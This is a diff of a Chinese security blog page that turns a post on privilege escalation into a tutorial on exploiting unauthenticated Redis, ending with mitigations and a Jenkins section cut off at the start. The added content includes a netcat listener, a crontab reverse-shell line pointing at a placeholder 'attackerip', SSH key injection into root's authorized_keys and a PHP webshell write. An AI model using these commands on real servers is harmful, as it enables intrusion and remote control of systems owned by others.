@@ -13,7 +13,7 @@
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
   <title>
     
-      越权 | Alita
+      未授权访问总结 | Alita
     
   </title>
   <meta name="author" content="耿">
@@ -49,7 +49,7 @@
 
 
 <!-- header -->
-<header class="fixbackground" data-img-mode="random" data-normal-src="/img/1.jpg" data-random-max="110" data-random-src="https://sariay.github.io/Random-img/">
+<header class="fixbackground" data-img-mode="random" data-normal-src="/img/1.jpg" data-random-max="110" data-random-src="/img/Random-img/">
 	<div class="mask">
 		<!-- Logo and navigation -->
 		<div class="h-header">
@@ -164,7 +164,7 @@
 	<!-- Page title -->
 	<p>
 		
-			当前文章&nbsp;:&nbsp;《越权》
+			当前文章&nbsp;:&nbsp;《未授权访问总结》
 		
 	</p>
 
@@ -280,7 +280,7 @@
 		<i class="fa fa-paper-plane-o" aria-hidden="true"></i>
 		
 	<a href="/2019/10/07/越权/" itemprop="url">
-		越权
+		未授权访问总结
 	</a>
 
 	</div>
@@ -313,7 +313,7 @@
 
 	<a href="/2019/10/07/越权/" itemprop="url">
 		<time datetime="2019-10-07T13:02:43.000Z" itemprop="dateUpdated">
-	  		2019-10-07
+	  		2019-10-08
 	  </time>
 	</a> 
 
@@ -323,6 +323,10 @@
 		<span>
 			<i class="fa fa-tags"></i>
 			
+	
+		<a href="/tags/未授权访问/" class=" ">
+			未授权访问
+		</a>
 	
 		<a href="/tags/越权/" class=" ">
 			越权
@@ -338,20 +342,46 @@
 	</div>
 
 	<div class="article-content" id="article-content">
-		<h1 id="1-越权"><a href="#1-越权" class="headerlink" title="1 越权"></a>1 越权</h1><h2 id="1-1-漏洞简介"><a href="#1-1-漏洞简介" class="headerlink" title="1.1 漏洞简介"></a>1.1 漏洞简介</h2><p>何为越权漏洞，通俗的理解为用户可以操作超出自己管理权限范围的功能，从而进行非一般用户可以操作的行为。越权一般可以分为：<strong>垂直越权，平行越权，以及非授权访问。</strong>而在非用户登陆模式下，任意用户访问特定地址或链接均可以访问到需要用户身份后才可以访问到的功能。越权也可以看为安全配置不当导致的未授权访问。</p>
-<h2 id="1-2-漏洞原理"><a href="#1-2-漏洞原理" class="headerlink" title="1.2 漏洞原理"></a>1.2 漏洞原理</h2><p>未授权访问是系统对用户限制不全，或者无限制，可以让任意用户或者限制访问用户，可以访问到内部敏感信息，导致的信息泄露，以及系统功能的执行。越权漏洞的产生原因是未对访问功能做权限的效对，或者限制不全，导致对用户的限制只局限于某一个功能和操作上。</p>
-<h2 id="1-3-漏洞危害"><a href="#1-3-漏洞危害" class="headerlink" title="1.3 漏洞危害"></a>1.3 漏洞危害</h2><ul>
-<li><p>未授权访问通常是会泄露用户信息，系统信息。某些服务和系统中，未授权访问还可以执行系统命令，操作系统文件，导致系统的整体安全遭到破坏。</p>
+		<h1 id="未授权访问漏洞总结"><a href="#未授权访问漏洞总结" class="headerlink" title="未授权访问漏洞总结"></a>未授权访问漏洞总结</h1><h2 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h2><p><font color="#ff0000">未授权访问可以理解为需要安全配置或权限认证的地址、授权页面存在缺陷，导致其他用户可以直接访问，从而引发重要权限可被操作、数据库、网站目录等敏感信息泄露。</font></p>
+<h2 id="0x02-redis未授权访问"><a href="#0x02-redis未授权访问" class="headerlink" title="0x02 redis未授权访问"></a>0x02 redis未授权访问</h2><h3 id="①-漏洞描述"><a href="#①-漏洞描述" class="headerlink" title="① 漏洞描述"></a>① 漏洞描述</h3><p>Redis因配置不当可以未授权访问。攻击者无需认证即可访问到内部数据，从而导致敏感数据泄漏，还可以恶意执行flushall清空所有数据。如果Redis是以root的身份运行，可以给root账户写入ssh公钥文件，直接通过ssh登录服务器。</p>
+<h3 id="②-漏洞利用"><a href="#②-漏洞利用" class="headerlink" title="② 漏洞利用"></a>② 漏洞利用</h3><h4 id="1-利用计划任务执行命令反弹shell"><a href="#1-利用计划任务执行命令反弹shell" class="headerlink" title="(1) 利用计划任务执行命令反弹shell"></a>(1) 利用计划任务执行命令反弹shell</h4><p>在redis以root权限运行时可以crontab执行命令反弹shell</p>
+<p>先在自己服务器上监听一个端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 2333</span><br></pre></td></tr></table></figure>
+
+<p>redis默认开放6379端口，且对外开放。可以通过此端口来执行命令写入文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# redis-cli -h 192.168.2.2  //victimip</span><br><span class="line">192.168.2.2:6379&gt; set x "\n* * * * * bash -i &gt;&amp; /dev/tcp/attackerip/2333 0&gt;&amp;1\n"</span><br><span class="line">OK</span><br><span class="line">192.168.2.2:6379&gt; config set dir /var/spool/cron/</span><br><span class="line">OK</span><br><span class="line">192.168.2.2:6379&gt; config set dbfilename root</span><br><span class="line">OK</span><br><span class="line">192.168.2.2:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-写入ssh-keygen公钥然后使用私钥登录"><a href="#2-写入ssh-keygen公钥然后使用私钥登录" class="headerlink" title="(2) 写入ssh-keygen公钥然后使用私钥登录"></a>(2) 写入ssh-keygen公钥然后使用私钥登录</h4><p>前提条件</p>
+<ul>
+<li><p><font color="red">Redis服务使用ROOT账号启动</font></p>
 </li>
-<li><p>越权可以分为<strong>水平越权</strong>和<strong>垂直越权</strong>。垂直越权漏洞会导致低权限用户用来执行高权限用户的功能，获取高权限用户的账号信息，执行高权限用户的操作功能。水平越权会导致同一层级间的用户可以互相访问到对方的敏感信息，如保存的地址、手机号、订单记录。同时还可能会以其他平级权限用户的身份来执行某行功能，如购买，删除，添加，修改等。</p>
+<li><p><font color="red">服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。</font></p>
 </li>
 </ul>
-<h1 id="2-未授权访问漏洞总结"><a href="#2-未授权访问漏洞总结" class="headerlink" title="2 未授权访问漏洞总结"></a>2 未授权访问漏洞总结</h1><h3 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h3><p><font color="#ff0000">未授权访问可以理解为需要安全配置或权限认证的地址、授权页面存在缺陷，导致其他用户可以直接访问，从而引发重要权限可被操作、数据库、网站目录等敏感信息泄露。</font></p>
-<p>目前主要存在未授权访问漏洞的有：NFS服务，Samba服务，LDAP，Rsync，FTP，GitLab，Jenkins，MongoDB，Redis，ZooKeeper，ElasticSearch，Memcache，CouchDB，Docker，Solr，Hadoop，Dubbo等</p>
+<p>首先在本地生成一对密钥：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/.ssh# ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
+
+<p>然后redis执行命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">victimip:6379&gt; config set dir /root/.ssh/</span><br><span class="line">OK</span><br><span class="line">victimip:6379&gt; config set dbfilename authorized_keys</span><br><span class="line">OK</span><br><span class="line">victimip:6379&gt; set x "生成的公钥"</span><br><span class="line">OK</span><br><span class="line">victimip:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
+
+<p>保存后便可以用私钥登陆服务器</p>
+<h4 id="3-往web物理路径写入webshell"><a href="#3-往web物理路径写入webshell" class="headerlink" title="(3) 往web物理路径写入webshell"></a>(3) 往web物理路径写入webshell</h4><p>当redis权限不高时，并且服务器开着web服务，在redis有web目录写权限时，可以尝试往web路径写webshell</p>
+<p>执行以下命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">victimip:6379&gt; config set dir /var/www/html/</span><br><span class="line">OK</span><br><span class="line">victimip:6379&gt; config set dbfilename shell.php</span><br><span class="line">OK</span><br><span class="line">victimip:6379&gt; set x "&lt;?php phpinfo();?&gt;"</span><br><span class="line">OK</span><br><span class="line">victimip:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
+
+<h3 id="③-漏洞修复"><a href="#③-漏洞修复" class="headerlink" title="③ 漏洞修复"></a>③ 漏洞修复</h3><p>可以配置redis.conf这个文件，在安装目录下</p>
+<ul>
+<li>1、默认只对本地开放  </li>
+<li>2、添加登陆密码</li>
+<li>3、在需要对外开放的时候修改默认端口</li>
+<li>4、限制ip登陆</li>
+</ul>
+<h2 id="0x03-Jenkins未授权访问"><a href="#0x03-Jenkins未授权访问" class="headerlink" title="0x03 Jenkins未授权访问"></a>0x03 Jenkins未授权访问</h2><h3 id="①-漏洞描述-1"><a href="#①-漏洞描述-1" class="headerlink" title="① 漏洞描述"></a>① 漏洞描述</h3><p>默认情况下Jenkins面板中用户可以选择执行脚本界面来操作一些系统层命令，攻击者可通过未授权访问漏洞或者暴力破解用户密码等进脚本执行界面从而获取服务器权限。</p>
+<h3 id="②-漏洞利用-1"><a href="#②-漏洞利用-1" class="headerlink" title="② 漏洞利用"></a>② 漏洞利用</h3><h4 id="1、Jenkins未授权访问可执行命令"><a href="#1、Jenkins未授权访问可执行命令" class="headerlink" title="1、Jenkins未授权访问可执行命令"></a>1、Jenkins未授权访问可执行命令</h4><p>访问victim:8080/manage<br>victim:8080/manage</p>
 	
 	</div>
 	
-	<div id="current-post-cover" data-scr="/img/cart_cover.jpg"></div>
+	<div id="current-post-cover" data-scr="http://pz1b4lp0z.bkt.clouddn.com/100.jpg"></div>
 
 	<!-- relate post, comment...-->
 	<div class="investment-container">
